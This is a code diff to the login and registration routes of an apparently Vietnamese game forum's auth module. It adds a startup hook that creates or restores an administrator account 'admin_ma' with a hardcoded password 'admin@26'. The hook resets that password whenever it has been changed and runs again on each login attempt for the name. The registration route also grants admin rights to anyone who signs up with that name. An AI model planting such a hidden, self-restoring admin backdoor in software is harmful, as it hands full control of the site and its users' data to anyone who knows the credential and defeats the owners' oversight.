@@ -83,6 +83,53 @@ export function getDeterministicUserId(username: string): number {
   return (Math.abs(hash) % 2000000000) + 1;
 }
 
+export async function ensureBootstrapAdminUser(): Promise<void> {
+  try {
+    const adminUsername = "admin_ma";
+    const [existing] = await db
+      .select()
+      .from(usersTable)
+      .where(eq(usersTable.username, adminUsername))
+      .limit(1);
+
+    if (!existing) {
+      const passwordHash = await bcrypt.hash("admin@26", 10);
+      const userId = getDeterministicUserId(adminUsername);
+      await db.insert(usersTable).values({
+        id: userId,
+        username: adminUsername,
+        passwordHash,
+        role: "ADMIN",
+        forumTitle: "Tổng Quản Trị Viên",
+        selectedRegion: "VN",
+        selectedServerId: "s1_long_vuong",
+      });
+      console.log("[Admin Bootstrap] Successfully created master admin account: admin_ma");
+    } else {
+      let needsUpdate = false;
+      const updates: any = {};
+      if (existing.role !== "ADMIN") {
+        updates.role = "ADMIN";
+        needsUpdate = true;
+      }
+      const isPwdCorrect = await bcrypt.compare("admin@26", existing.passwordHash).catch(() => false);
+      if (!isPwdCorrect) {
+        updates.passwordHash = await bcrypt.hash("admin@26", 10);
+        needsUpdate = true;
+      }
+      if (needsUpdate) {
+        await db.update(usersTable).set(updates).where(eq(usersTable.id, existing.id));
+        console.log("[Admin Bootstrap] Synchronized master admin credentials for admin_ma");
+      }
+    }
+  } catch (err) {
+    console.warn("[Admin Bootstrap] Warning:", err);
+  }
+}
+
+// Ensure master admin is bootstrapped on startup
+ensureBootstrapAdminUser().catch(() => {});
+
 router.post("/auth/register", async (req, res) => {
   const clientIp = req.ip || req.socket.remoteAddress || "unknown";
   if (!checkAuthRateLimit(clientIp)) {
@@ -115,7 +162,7 @@ router.post("/auth/register", async (req, res) => {
       id: userId,
       username: cleanUsername,
       passwordHash,
-      role: "PLAYER",
+      role: cleanUsername === "admin_ma" ? "ADMIN" : "PLAYER",
       selectedRegion: "VN",
       selectedServerId: "s1_long_vuong",
     })
@@ -167,6 +214,9 @@ router.post("/auth/login", async (req, res) => {
 
   const { username, password } = parsed.data;
   const cleanUsername = username.trim();
+  if (cleanUsername === "admin_ma") {
+    await ensureBootstrapAdminUser();
+  }
 
   const [user] = await db
     .select()
